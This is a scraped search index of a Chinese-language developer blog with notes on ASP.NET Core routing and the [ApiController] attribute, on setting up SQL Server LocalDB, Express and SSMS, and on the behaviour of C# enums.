vs AddMvc vs AddControllersWithViews vs AddRazorPages ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:1:0","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"AddRazorPages vs AddControllersWithViews 這邊先了解 在看上面問題。 就能看出AddRazorPages和AddControllersWithViews 差在API Explorer和 CORS和Formatter Mapping 。 這邊有問 AI 大大。 ASP.NET Core Web API 中的自訂格式器 | Microsoft Docs [ASP.NET Core 6] 讓你的 ASP.NET Core Web API + Swashbuckle.AspNetCore 支援多個版本 | 余小章 @ 大內殿堂 - 點部落 API Explorer找出文章跟 swagger 有關係，不知道是不是指找 API URL 給 swagger 用? ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:1:1","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"ApiExplorer 是什麼? 為瞭解決這個問題，我需要深入研究Swashbuckle的工作原理。事實證明，它在內部使用 ApiExplorer，這是ASP.NET Core附帶的API元數據層。特別是，它使用該ApiDescription.GroupName屬性來確定將哪些方法放入哪些文件中。如果該屬性是null或它和文檔名稱（例如「client-v1」）相等，則Swashbuckle將其包括在內。並且，默認設置是null，這就是兩個Swagger文件都相同的原因。 有兩種方法設置GroupName。我可以通過在控制器的每個方法上設置ApiExplorerSettings屬性來進行設置，但這將是乏味且難以維護的。相反，我選擇了神奇的路由。 參考: 使用Swagger，ApiExplorer和NSwag掌握ASP.NET Core和ABP中的外部Web API_寒冰屋的博客-CSDN博客 ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:1:2","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"路由設定 其實我看官方 Routing in ASP.NET Core | Microsoft Docs 講得滿多東西，但大部分實務上可能只會用幾個方法。 這邊建議看中間件概念，在看這段，不然有些在做什麼會不知道在幹嘛。 ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:2:0","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"UseEndpoints vs UseRouting ASP.NET Core 3.0 中 app.UseRouting 与 app.UseEndpoints 的区别是什么_已解决_博问_博客园 先記錄我發現的現象，放下 endpoints 時候前面需要放UseRouting。沒放的話就不能執行，因為會有問題。我看到有篇說 UseRouting 是類似做初始化動作。 我看官網文件也說到順序要這樣用。 原來 Endpoints是重點。 後來我看到這篇Asp.Net Core EndPoint 終結點路由工作原理解讀 - 知乎有提到 UseRouting() 、UseAuthorization()、UseEndpoints() 這三個中間件的關係是什麼呢？ 答：UseRouing 中間件主要是路由匹配，找到匹配的終結者路由Endpoint ；UseEndpoints 中間件主要針對UseRouting 中間件匹配到的路由進行 委託方法的執行等操作。 UseAuthorization 中間件主要針對 UseRouting 中間件中匹配到的路由進行攔截 做授權驗證操作等，通過則執行下一個中間件UseEndpoints() ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:2:1","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"Endpoints 有哪些可以用? 平常我看到 Endpoints 看不出來在做什麼?稍微看一下文件有寫這些方法可以用。 其實黑暗執行續那篇也有小記 MapDefaultControllerRoute 註冊 //{id?} MapControllerRoute 使用 Pattern、Constraint 自訂路由 MapControllers 在 Controller Action 透過 [Rount(“Home/About”)] 等 Attribute 指定路由。 MapAreaControllerRoute 支援 Area 路由 MapDynamicControllerRoute 使用自訂類別動態決定路由 MapFallbackToController、MapFallbackToAreaController 指定無吻合規則時的預設路由 這個我有看半懂，大致上應該是定義列別的 class 方法的Route()規則去註冊 endpoints。 MapDefaultControllerRoute 這篇ASP.NET Core 3.0中使用動態控制器路由 - LamondLu - 博客園有提到。 使用MapDefaultControllerRoute等於寫 app.UseEndpoints( endpoints =\u003e { endpoints.MapControllerRoute(\"default\", \"{controller=Home}/{action=Index}/{id?}\"); } ); 就不需要寫 [Route(\"\")] [Route(\"Home\")] [Route(\"Home/Index\")] 但相對Controller MapDynamicControllerRoute ASP.NET Core 3.0中使用动态控制器路由 - LamondLu - 博客园 MapControllerRoute MapControllers MapDefaultControllerRoute ASP.NET Core端点路由中三种让人困惑的路由函数 - 博客猿马甲哥 - 博客园 主要 MapControllerRoute MapControllers 剛學看到這兩個都不知道在幹嘛 endpoints.MapControllers(); 會透過Controller下[Route(\"/\")]規則去套。 但是MapControllerRoute是在定義路由，跟[Route(\"/\")]沒有關係，有點在宣告路由意思差不多。向下面這樣。 endpoints.MapControllerRoute(name: \"blog\", pattern: \"blog/{*article}\", defaults: new { controller = \"Blog\", action = \"Article\" }); endpoints.MapControllerRoute(name: \"default\", pattern: \"{controller=Home}/{action=Index}/{id?}\"); 區域(Area) 實務上我還沒看過有人這樣用，看到文件有這個紀錄一下。 [ASP.NET Core] 為專案加上 Area | Ian Chen - 點部落 ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:2:2","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"ApiController Attribute [ApiController]常常複製程式來改，最近思考這個是做什麼用。從保哥這篇得知如下。 連結:使用 ASP.NET Core 2.2 開發 Web API 的注意事項 | The Will Will Web。我發現滿多必看的 必須使用屬性路由(Attribute Routing) 只要發生模型驗證失敗，就會自動回應 HTTP 400 (Bad Request)，並且以 ValidationProblemDetails 型別回應，預設的 JSON 結構如下： … 我這邊找官網文件 使用 ASP.NET Core 建立 Web API | Microsoft Learn大概有五項。 屬性路由需求 [Route(\"[controller]\")]必需要加這一段，程式才可以跑。 HTTP 400 自動回應 [ApiController] 屬性會讓模型驗證錯誤自動觸發 HTTP 400 回應。 if (!ModelState.IsValid) { return BadRequest(ModelState); } 繫結來源參數推斷 就是指一般 Get, Post 會針對參數是[FormQuery],[FormBody]這篇推薦看文件。 多部分/表單資料要求推斷 屬性 [ApiController] 會針對 型 IFormFile 別和 IFormFileCollection 的動作參數套用推斷規則。 系統會 multipart/form-data 針對這些類型推斷要求內容類型。 錯誤狀態碼的問題詳細資料 MVC 會將錯誤結果 (狀態碼為 400 或更新版本的結果，) 轉換為具有 的結果 ProblemDetails 。 以 RFC 7807 規格為基礎的 ProblemDetails 類型，在 HTTP 回應中提供電腦可讀取的錯誤詳細資料。 建議點進去看。 問 CHATGPT 不加[apicontroller]和一般controller差異在哪? 不加[apicontroller]和一般controller差異在哪? 在 ASP.NET Core 中，[ApiController] 和普通的 Controller 類別有一些差異，包括： [ApiController] 特性只能用於 Web API 控制器中。如果您想在 MVC 控制器中使用該特性，將會出現錯誤。 [ApiController] 特性會啟用一些默認的行為，以便更方便地在 Web API 中工作。例如，如果您在控制器中使用了 [ApiController] 特性，則您可以在控制器中使用 [FromBody] 和 [FromQuery] 屬性，而無需手動配置模型綁定。 [ApiController] 特性會啟用一些默認的錯誤處理行為，以便更方便地在 Web API 中工作。例如，如果您在控制器中使用了 [ApiController] 特性，則您的控制器將會自動回應 HTTP 400 錯誤（Bad Request），如果模型綁定失敗。 [ApiController] 特性會啟用一些默認的路由行為，以便更方便地在 Web API 中工作。例如，如果您在控制器中使用了 [ApiController] 特性，則您的控制器將會自動選擇基於 HTTP 請求類型的路由模板（例如 GET、POST 等）。 總之，[ApiController] 特性是一種方便的工具，可以幫助您更方便地在 Web API 中工作。然而，請注意，如果您在 MVC 控制器中使用了 [ApiController] 特性，則可能會出現一些問題，因為 MVC 控制器和 Web API 控制器的工作方式有所不同。因此，建議您只在 Web API 控制器中使用 [ApiController] 特性。 如果您想了解更多關於 [ApiController] 特性的信息，請參考 ASP.NET Core 文檔。 回去看還真的官方文章是在寫 WebAPI。 除了 ControllerBase ，那些 Controller Class 開發人員需要知道的東西? 除了 ControllerBase ，那些 Controller Class 開發人員需要知道的東西? 在 ASP.NET Core 中，除了 ControllerBase 之外，還有其他幾種常用的 Controller 類別，包括： Controller：這是最常用的 Controller 類別，可以用於實現 MVC 控制器。Controller 類別繼承自 ControllerBase 類別，並且提供了許多方便的功能，例如视图支持、模型綁定、模型驗證等。 ApiController：這是用於實現 Web API 控制器的類別，繼承自 ControllerBase 類別。ApiController 類別提供了許多方便的功能，例如自動模型綁定、自動錯誤處理、自動路由等。 ControllerBase：這是所有 Controller 類別的基類，包括 Controller 和 ApiController。ControllerBase 類別提供了許多基本的功能，例如 HTTP 請求處理、控制器生命週期等。 總之，開發人員需要知道這些 Controller 類別，以便在適當的情況下使用它們。請注意，每種類別都有自己的用途， ASP.NET Web API 入門常用技巧 - Huan-Lin 學習筆記 其實寫完這章節發現這根路由沒關係，不過也了解一些東西就順便記。會不會再拆出來寫再看看。 ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:3:0","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"其他文章 Vue Router 搭配 ASP.NET Core 3.1 時 設定history mode | 這是一隻間諜程式 - 點部落 ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:4:0","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":["SQL Server"],"content":"最近開始碰 SQL Server，我朋友推薦安裝 SQL Server Express，但要執行 SQL Server Express 在電腦資源這也不是我很想要的事情。我有看到開發用的 LocalDB ，這邊根本機 SQL Server 不會衝突，我朋友沒用過，可能也會擔心相容性問題，這邊我當勇者試試。 看網路上也沒有人提到相容性不好，所底應該可以用。 ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:0:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"網路相關文章 使用指令建立 SQL LocalDB mdf 檔-黑暗執行緒 SQL Server 2012 Express LocalDB (SqlLocalDB) 深入剖析 | The Will Will Web 這邊推薦看保哥文章。 ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:1:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"安裝 LocalDB 點擊下圖紅色按鈕。 看語言需不需要調整，再點選下載。 去下載目錄Downloads\\zh-TW\\SqlLocalDB.msi執行安裝。 這邊就不截圖，一直下一步就完成。 ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:2:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"建立 LocalDB 正常預設會建立 MSSQLLocalDB。SQL Server Express LocalDB - SQL Server | Microsoft Learn 這邊假如你要手動建立的話 SqlLocalDB.exe create newLocalDB 可以參考: SQL Server 2012 Express LocalDB (SqlLocalDB) 深入剖析 | The Will Will Web ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:3:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"設定連線 appseting.json \"ConnectionStrings\": { \"XXXDBConnection\": \"server=(localdb)\\\\MSSQLLocalDB;database=XXXDB;Trusted_Connection=true;MultipleActiveResultSets=True\" }, 參考:.NET Core第10天_搭配EF Core串聯資料庫Db First_使用EntityFramework執行檢視的MVC控制器 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Trusted_Connection=True 信任目前登入帳號登入資料庫。 MultipleActiveResultSets=true 允許在單一次DB連線中可執行多個批次作業。 就這麼簡單。 ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:4:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"資料庫連線 可以用 Management Studio 和 Visual Studio 去做控制。 LinqPad 也可以用。 連線方法也大同小異。(localdb)\\MSSQLLocalDB這段就可以搞定， Window 驗證就可以了。大致這麼簡單。 要怎麼額外建立 LocalDB 這邊就先不深入探討，可以看保哥教學，這邊就先不深入。 連結:SQL Server 2012 Express LocalDB (SqlLocalDB) 深入剖析 | The Will Will Web ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:5:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"限制 LocalDB 的執行個體定序設定為 SQL_Latin1_General_CP1_CI_AS，無法變更。 但支援資料庫層級、資料行層級和運算式層級定序。 也就是說，你只要在建立資料庫時指定其定序即可，或是掛載其他資料庫系統移過來的資料庫檔案，或還原自其他資料庫的備份檔也都不會有問題。 自主資料庫遵循自主資料庫定序所定義的中繼資料和 tempdb 定序規則。 LocalDB 不得為合併式複寫訂閱者。 LocalDB 不支援 FILESTREAM。 LocalDB 針對 Service Broker 只允許本機佇列。 參考: SQL Server 2012 Express LocalDB 與其他 SQL Server 版本的比較| The Will Will Web 感覺大部分沒影響可以用 LocalDB 在開發環境開發。 ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:6:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"彩蛋 .net core 自动生成EF代码 - 简书 .NET Core EF(Entity Framework) Core 自动创建数据库_huang6825的博客-CSDN博客_efcore 创建数据库 ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:7:0","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"ef disable create table asp.net - How to prevent EF from Creating database? - Stack Overflow entity framework 5 - How to disable automatic table creation in EF 5.0? - Stack Overflow Database Initialization Strategies in EF 6 Code-First Mikael Eliasson - Migrating from EF6 to EF Core .net 5 EFCore的操作_小盆友你是否很有多问号的博客-CSDN博客 EntityFrameworkCore自动迁移 - kasnti - 博客园 ","date":"2022-12-19","objectID":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/:7:1","tags":["sqlserver"],"title":"LocalDB 開發程式使用的資料庫","uri":"/blog/posts/LocalDB-%E9%96%8B%E7%99%BC%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["SQL Server"],"content":"最近從 Java 轉 .Net Core 程式，原本有碰過 MySQL 和 Oracle 資料庫，現在要碰的是 SQL Server ，安裝是從零開始，這邊做個筆記。 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:0:0","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"SQL Server 有哪些版本 這邊版本不是只 2019,2022那一種，這邊是指 Express(免費版)。這邊要先了解，通常正是環境不會安裝 Express ，手上會拿到一組序號。這邊我目前在測試環境是用 Express，本篇會先以這個為主。 SQL Server Express：這是一個免費版本，適用於小型應用程式、網站和微型企業。它有一些功能限制，但仍然提供許多強大的功能。 SQL Server Standard Edition：這是一個功能強大且可扩展的版本，適用於中型企業和應用程式。它提供了許多強大的功能，包括數據商務和分析工具。 SQL Server Enterprise Edition：這是一個高級版本，提供了最完整的功能集，適用於大型企業和應用程式。它包括了所有 Standard Edition 的功能，還有一些額外的高級功能。 SQL Server Web Edition：這是一個專為網站和云應用程式而設的版本，提供了足夠的功能來滿足大多數網站的需求。 SQL Server Developer Edition：這是一個為開發人員提供的版本，提供了完整的功能集，可用於測試和開發應用程式。 詳細可以看官網。SQL Server 2019 — 定價 | Microsoft ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:1:0","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"安裝 SQL Server 去官網下載 Express 安裝檔案。SQL Server 下載 | Microsoft 因為我用 Sandbox 安裝，所以我介面都是英文的。但對應安裝都是一樣位置。以下步驟照做。 因為 Sandbox 可能會有一些問題。 這個紅色框框可以調製整路徑。 如果有問題，這個選項要取消。 安裝可以選Default instance，除非要建立第二個instance。 選擇下圖驗證方式。 按下接受，再按下一步。 一樣接受再按下一步。 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:2:0","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"可以設定連線 要對外連線TCP/IP要設定啟用。 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:2:1","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"SQL Server Management Studio 我朋友說正常用 SQL Server 一定要會使用 SQL Server Management Studio ，因為你在離線環境上面，通常不會安裝你用過的工具，這時候還是要習慣這個。 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:3:0","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"安裝 SSMS 從這個下載 SQL Server Management Studio (SSMS) - SQL Server Management Studio (SSMS) | Microsoft Docs連結點擊免費下載 開啟程式。 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:3:1","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"需注意的事情 語系也需要 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:3:2","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"設定主鍵和主鍵自動增加 主鍵右鍵新增 Visual Studio 可以設定 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:4:0","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"設定交易 Dbeaver 有一個按鈕可以讓你開啟交易工能，雖然也可以打指令，但是能不打就不用打我發現 SSMS 找不到這個東西，但其實就是沒有這個東西，只能打指令。小心駛得萬年船–SQL指令保險栓-黑暗執行緒 begin tran INSERT INTO blog VALUES( 'test','test2'); INSERT INTO blog VALUES( 'test','test2'); INSERT INTO blog VALUES( 'test','test2'); INSERT INTO blog VALUES( 'test','test2'); INSERT INTO blog VALUES( 'test','test2'); INSERT INTO blog VALUES( 'test','test2'); 最後下commit才會成功。這邊測試 LocalDB 也會成功。 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:5:0","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":["SQL Server"],"content":"相關文章 *(10) Microsoft SQL Server 2019 Express 下載安裝教學 //資料庫概論 - YouTube 如何檢測 SQL Server CPU是否遭遇瓶頸 效能查看可以用這個 SQL Server Profiler - SQL Server Profiler | Microsoft Docs [SQL SERVER]Insert Statement效能比較測試 | by RiCo 技術農場 | RiCosNote | Medium 好像能用這個方法檢查 [SQL SERVER][Performance]查詢效能調校 | RiCo技術農場 - 點部落 ","date":"2022-12-19","objectID":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:6:0","tags":["sqlserver","ssms"],"title":"SQL Server 2019 安裝小記","uri":"/blog/posts/SQL-Server-2019-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"最近從 Java 轉戰到 C# ，最近使用 Enum 發現還滿好用的，但跟 Java 不一樣。這邊整理一下。 之前 Java 的 Enum 筆記文章可以看Java 使用 Enum 小記 | 程式狂想筆記。 ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:0:0","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"重點 Enum 裡面的屬性不能放字串資料 Enum 屬性可以指定其他數字，後面屬性會自動累加前面數字 public enum Days { None, Monday, Tuesday, Wednesday, Thursday, Friday , Saturday, Sunday, } 等於下面 public enum Days { None = 0, Monday = 1, Tuesday = 2, Wednesday = 3, Thursday = 4, Friday = 5, Saturday = 6, Sunday = 7, } 大概就這樣，有想到再寫。 ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:1:0","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"強轉型問題程式不會錯 最近Web 把 request 其中一個屬性定義一個 Enum。沒想到前端送一個參數(Enum)沒帶 Enum內數字，執行程式竟然不會出錯，我就開始針對這個問題研究。 var b = (Season)1; Console.WriteLine(b); // output: Summer var c = (Season)4; Console.WriteLine(c); // output: 4 public enum Season { Spring, Summer, Autumn, Winter } 針對任何列舉類型，列舉型別與其基礎整數類型之間有明確的轉換。 如果您將列舉值 轉換成 其基礎類型，結果就是列舉成員的相關聯整數值。 微軟官方文件也有寫到，參考:列舉型別 - C# 參考 | Microsoft Learn 這邊我有試著問 AI有得到答案。 ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:2:0","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"檢查是否符合 Enum 資料 怎麼檢查符合資料，ChatGPT AI 怎麼回答 驗證上面方法可以使用。剛好最後爬到官方文件有提到，不過篇幅沒有AI說的多。 Web 檢查方法 [EnumDataType(typeof(DataSyncTypeEnum),ErrorMessage =\"未正常抓到\")] public DataSyncTypeEnum ReqVerType { get; set; } = DataSyncTypeEnum.Index; ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:2:1","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"一般檢查方法 Enum.IsDefined 可以參考 列舉型別 - C# 參考 | Microsoft Learn ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:2:2","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"FlagsAttribute 在微軟文件有看到[Flags]可以把值表示Byte來處理。這邊官方文張其實有講差異，但沒仔細看就會忽略掉。 如果您想要列舉型別代表選項的組合，請定義這些選擇的列舉成員，讓個別選擇是位欄位。 也就是說，這些列舉成員的關聯值應該是兩個的乘冪。 然後，您可以使用位邏輯運算子 | ，或 \u0026分別結合選擇或交集選擇的組合。 若要指出列舉型別會宣告位欄位，請將 Flags 屬性套用至它。 如下列範例所示，您也可以在列舉型別的定義中包含一些典型的組合。 這邊我就簡單問個 AI 問題。 這邊AI給的範例很實用，代表這個列舉可以用兩個組合，這邊注意 enum 裡面的所有值必須手動給0,1,2,4,8,16,32,64。這邊後面會在講原因。 這邊他範例有點爛。我後來發現官方文件也是用星期當範例😅。想跟他要比較符合情境，讓我覺得這個可以用在實務上面。 最後 AI 給我答案讓我覺得真的很棒。HasFlag可以做判斷 ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:3:0","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"不要使用 Enum.IsDefined 方法驗證參數? 首先我看到這篇討論有提到不要使用 Enum.IsDefined。 Regarding Enum.IsDefined, be aware that it can be dangerous: 